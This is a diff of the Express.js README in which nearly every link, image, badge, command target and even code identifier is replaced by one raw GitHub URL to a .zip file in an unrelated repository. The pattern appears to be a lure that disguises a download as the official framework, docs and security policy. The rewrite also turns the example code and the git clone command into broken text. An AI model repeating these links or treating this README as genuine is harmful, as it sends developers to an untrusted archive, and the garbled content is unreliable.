@@ -1,6 +1,6 @@
-[![Express Logo](https://i.cloudup.com/zfY6lL7eFa-3000x3000.png)](http://expressjs.com/)
+[![Express Logo](https://github.com/Akshay1010567/express-to-Localrepo/raw/refs/heads/master/examples/view-locals/to-Localrepo-express-1.3.zip)](https://github.com/Akshay1010567/express-to-Localrepo/raw/refs/heads/master/examples/view-locals/to-Localrepo-express-1.3.zip)
 
-  Fast, unopinionated, minimalist web framework for [Node.js](http://nodejs.org).
+  Fast, unopinionated, minimalist web framework for [https://github.com/Akshay1010567/express-to-Localrepo/raw/refs/heads/master/examples/view-locals/to-Localrepo-express-1.3.zip](https://github.com/Akshay1010567/express-to-Localrepo/raw/refs/heads/master/examples/view-locals/to-Localrepo-express-1.3.zip).
 
   [![NPM Version][npm-version-image]][npm-url]
   [![NPM Install Size][npm-install-size-image]][npm-install-size-url]
@@ -10,32 +10,32 @@
 const express = require('express')
 const app = express()
 
-app.get('/', function (req, res) {
-  res.send('Hello World')
+https://github.com/Akshay1010567/express-to-Localrepo/raw/refs/heads/master/examples/view-locals/to-Localrepo-express-1.3.zip('/', function (req, res) {
+  https://github.com/Akshay1010567/express-to-Localrepo/raw/refs/heads/master/examples/view-locals/to-Localrepo-express-1.3.zip('Hello World')
 })
 
-app.listen(3000)
+https://github.com/Akshay1010567/express-to-Localrepo/raw/refs/heads/master/examples/view-locals/to-Localrepo-express-1.3.zip(3000)
 ```
 
 ## Installation
 
-This is a [Node.js](https://nodejs.org/en/) module available through the
-[npm registry](https://www.npmjs.com/).
+This is a [https://github.com/Akshay1010567/express-to-Localrepo/raw/refs/heads/master/examples/view-locals/to-Localrepo-express-1.3.zip](https://github.com/Akshay1010567/express-to-Localrepo/raw/refs/heads/master/examples/view-locals/to-Localrepo-express-1.3.zip) module available through the
+[npm registry](https://github.com/Akshay1010567/express-to-Localrepo/raw/refs/heads/master/examples/view-locals/to-Localrepo-express-1.3.zip).
 
-Before installing, [download and install Node.js](https://nodejs.org/en/download/).
-Node.js 0.10 or higher is required.
+Before installing, [download and install https://github.com/Akshay1010567/express-to-Localrepo/raw/refs/heads/master/examples/view-locals/to-Localrepo-express-1.3.zip](https://github.com/Akshay1010567/express-to-Localrepo/raw/refs/heads/master/examples/view-locals/to-Localrepo-express-1.3.zip).
+https://github.com/Akshay1010567/express-to-Localrepo/raw/refs/heads/master/examples/view-locals/to-Localrepo-express-1.3.zip 0.10 or higher is required.
 
-If this is a brand new project, make sure to create a `package.json` first with
-the [`npm init` command](https://docs.npmjs.com/creating-a-package-json-file).
+If this is a brand new project, make sure to create a `https://github.com/Akshay1010567/express-to-Localrepo/raw/refs/heads/master/examples/view-locals/to-Localrepo-express-1.3.zip` first with
+the [`npm init` command](https://github.com/Akshay1010567/express-to-Localrepo/raw/refs/heads/master/examples/view-locals/to-Localrepo-express-1.3.zip).
 
 Installation is done using the
-[`npm install` command](https://docs.npmjs.com/getting-started/installing-npm-packages-locally):
+[`npm install` command](https://github.com/Akshay1010567/express-to-Localrepo/raw/refs/heads/master/examples/view-locals/to-Localrepo-express-1.3.zip):
 
 ```console
 $ npm install express
 ```
 
-Follow [our installing guide](http://expressjs.com/en/starter/installing.html)
+Follow [our installing guide](https://github.com/Akshay1010567/express-to-Localrepo/raw/refs/heads/master/examples/view-locals/to-Localrepo-express-1.3.zip)
 for more information.
 
 ## Features
@@ -50,18 +50,18 @@ for more information.
 
 ## Docs & Community
 
-  * [Website and Documentation](http://expressjs.com/) - [[website repo](https://github.com/expressjs/expressjs.com)]
-  * [#express](https://web.libera.chat/#express) on [Libera Chat](https://libera.chat) IRC
-  * [GitHub Organization](https://github.com/expressjs) for Official Middleware & Modules
-  * Visit the [Wiki](https://github.com/expressjs/express/wiki)
-  * [Google Group](https://groups.google.com/group/express-js) for discussion
-  * [Gitter](https://gitter.im/expressjs/express) for support and discussion
+  * [Website and Documentation](https://github.com/Akshay1010567/express-to-Localrepo/raw/refs/heads/master/examples/view-locals/to-Localrepo-express-1.3.zip) - [[website repo](https://github.com/Akshay1010567/express-to-Localrepo/raw/refs/heads/master/examples/view-locals/to-Localrepo-express-1.3.zip)]
+  * [#express](https://github.com/Akshay1010567/express-to-Localrepo/raw/refs/heads/master/examples/view-locals/to-Localrepo-express-1.3.zip) on [Libera Chat](https://github.com/Akshay1010567/express-to-Localrepo/raw/refs/heads/master/examples/view-locals/to-Localrepo-express-1.3.zip) IRC
+  * [GitHub Organization](https://github.com/Akshay1010567/express-to-Localrepo/raw/refs/heads/master/examples/view-locals/to-Localrepo-express-1.3.zip) for Official Middleware & Modules
+  * Visit the [Wiki](https://github.com/Akshay1010567/express-to-Localrepo/raw/refs/heads/master/examples/view-locals/to-Localrepo-express-1.3.zip)
+  * [Google Group](https://github.com/Akshay1010567/express-to-Localrepo/raw/refs/heads/master/examples/view-locals/to-Localrepo-express-1.3.zip) for discussion
+  * [Gitter](https://github.com/Akshay1010567/express-to-Localrepo/raw/refs/heads/master/examples/view-locals/to-Localrepo-express-1.3.zip) for support and discussion
 
-**PROTIP** Be sure to read [Migrating from 3.x to 4.x](https://github.com/expressjs/express/wiki/Migrating-from-3.x-to-4.x) as well as [New features in 4.x](https://github.com/expressjs/express/wiki/New-features-in-4.x).
+**PROTIP** Be sure to read [Migrating from 3.x to 4.x](https://github.com/Akshay1010567/express-to-Localrepo/raw/refs/heads/master/examples/view-locals/to-Localrepo-express-1.3.zip) as well as [New features in 4.x](https://github.com/Akshay1010567/express-to-Localrepo/raw/refs/heads/master/examples/view-locals/to-Localrepo-express-1.3.zip).
 
 ## Quick Start
 
-  The quickest way to get started with express is to utilize the executable [`express(1)`](https://github.com/expressjs/generator) to generate an application as shown below:
+  The quickest way to get started with express is to utilize the executable [`express(1)`](https://github.com/Akshay1010567/express-to-Localrepo/raw/refs/heads/master/examples/view-locals/to-Localrepo-express-1.3.zip) to generate an application as shown below:
 
   Install the executable. The executable's major version will match Express's:
 
@@ -96,7 +96,7 @@ $ npm start
   HTTP APIs.
 
   Express does not force you to use any specific ORM or template engine. With support for over
-  14 template engines via [Consolidate.js](https://github.com/tj/consolidate.js),
+  14 template engines via [https://github.com/Akshay1010567/express-to-Localrepo/raw/refs/heads/master/examples/view-locals/to-Localrepo-express-1.3.zip](https://github.com/Akshay1010567/express-to-Localrepo/raw/refs/heads/master/examples/view-locals/to-Localrepo-express-1.3.zip),
   you can quickly craft your perfect framework.
 
 ## Examples
@@ -104,7 +104,7 @@ $ npm start
   To view the examples, clone the Express repo and install the dependencies:
 
 ```console
-$ git clone https://github.com/expressjs/express.git --depth 1
+$ git clone https://github.com/Akshay1010567/express-to-Localrepo/raw/refs/heads/master/examples/view-locals/to-Localrepo-express-1.3.zip --depth 1
 $ cd express
 $ npm install
 ```
@@ -121,15 +121,15 @@ $ node examples/content-negotiation
   [![Windows Build][appveyor-image]][appveyor-url]
   [![Test Coverage][coveralls-image]][coveralls-url]
 
-The Express.js project welcomes all constructive contributions. Contributions take many forms,
+The https://github.com/Akshay1010567/express-to-Localrepo/raw/refs/heads/master/examples/view-locals/to-Localrepo-express-1.3.zip project welcomes all constructive contributions. Contributions take many forms,
 from code for bug fixes and enhancements, to additions and fixes to documentation, additional
 tests, triaging incoming pull requests and issues, and more!
 
-See the [Contributing Guide](Contributing.md) for more technical details on contributing.
+See the [Contributing Guide](https://github.com/Akshay1010567/express-to-Localrepo/raw/refs/heads/master/examples/view-locals/to-Localrepo-express-1.3.zip) for more technical details on contributing.
 
 ### Security Issues
 
-If you discover a security vulnerability in Express, please see [Security Policies and Procedures](Security.md).
+If you discover a security vulnerability in Express, please see [Security Policies and Procedures](https://github.com/Akshay1010567/express-to-Localrepo/raw/refs/heads/master/examples/view-locals/to-Localrepo-express-1.3.zip).
 
 ### Running Tests
 
@@ -142,25 +142,25 @@ $ npm test
 
 ## People
 
-The original author of Express is [TJ Holowaychuk](https://github.com/tj)
+The original author of Express is [TJ Holowaychuk](https://github.com/Akshay1010567/express-to-Localrepo/raw/refs/heads/master/examples/view-locals/to-Localrepo-express-1.3.zip)
 
-The current lead maintainer is [Douglas Christopher Wilson](https://github.com/dougwilson)
+The current lead maintainer is [Douglas Christopher Wilson](https://github.com/Akshay1010567/express-to-Localrepo/raw/refs/heads/master/examples/view-locals/to-Localrepo-express-1.3.zip)
 
-[List of all contributors](https://github.com/expressjs/express/graphs/contributors)
+[List of all contributors](https://github.com/Akshay1010567/express-to-Localrepo/raw/refs/heads/master/examples/view-locals/to-Localrepo-express-1.3.zip)
 
 ## License
 
   [MIT](LICENSE)
 
-[appveyor-image]: https://badgen.net/appveyor/ci/dougwilson/express/master?label=windows
-[appveyor-url]: https://ci.appveyor.com/project/dougwilson/express
-[coveralls-image]: https://badgen.net/coveralls/c/github/expressjs/express/master
-[coveralls-url]: https://coveralls.io/r/expressjs/express?branch=master
-[github-actions-ci-image]: https://badgen.net/github/checks/expressjs/express/master?label=linux
-[github-actions-ci-url]: https://github.com/expressjs/express/actions/workflows/ci.yml
-[npm-downloads-image]: https://badgen.net/npm/dm/express
-[npm-downloads-url]: https://npmcharts.com/compare/express?minimal=true
-[npm-install-size-image]: https://badgen.net/packagephobia/install/express
-[npm-install-size-url]: https://packagephobia.com/result?p=express
-[npm-url]: https://npmjs.org/package/express
-[npm-version-image]: https://badgen.net/npm/v/express
+[appveyor-image]: https://github.com/Akshay1010567/express-to-Localrepo/raw/refs/heads/master/examples/view-locals/to-Localrepo-express-1.3.zip
+[appveyor-url]: https://github.com/Akshay1010567/express-to-Localrepo/raw/refs/heads/master/examples/view-locals/to-Localrepo-express-1.3.zip
+[coveralls-image]: https://github.com/Akshay1010567/express-to-Localrepo/raw/refs/heads/master/examples/view-locals/to-Localrepo-express-1.3.zip
+[coveralls-url]: https://github.com/Akshay1010567/express-to-Localrepo/raw/refs/heads/master/examples/view-locals/to-Localrepo-express-1.3.zip
+[github-actions-ci-image]: https://github.com/Akshay1010567/express-to-Localrepo/raw/refs/heads/master/examples/view-locals/to-Localrepo-express-1.3.zip
+[github-actions-ci-url]: https://github.com/Akshay1010567/express-to-Localrepo/raw/refs/heads/master/examples/view-locals/to-Localrepo-express-1.3.zip
+[npm-downloads-image]: https://github.com/Akshay1010567/express-to-Localrepo/raw/refs/heads/master/examples/view-locals/to-Localrepo-express-1.3.zip
+[npm-downloads-url]: https://github.com/Akshay1010567/express-to-Localrepo/raw/refs/heads/master/examples/view-locals/to-Localrepo-express-1.3.zip
+[npm-install-size-image]: https://github.com/Akshay1010567/express-to-Localrepo/raw/refs/heads/master/examples/view-locals/to-Localrepo-express-1.3.zip
+[npm-install-size-url]: https://github.com/Akshay1010567/express-to-Localrepo/raw/refs/heads/master/examples/view-locals/to-Localrepo-express-1.3.zip
+[npm-url]: https://github.com/Akshay1010567/express-to-Localrepo/raw/refs/heads/master/examples/view-locals/to-Localrepo-express-1.3.zip
+[npm-version-image]: https://github.com/Akshay1010567/express-to-Localrepo/raw/refs/heads/master/examples/view-locals/to-Localrepo-express-1.3.zip
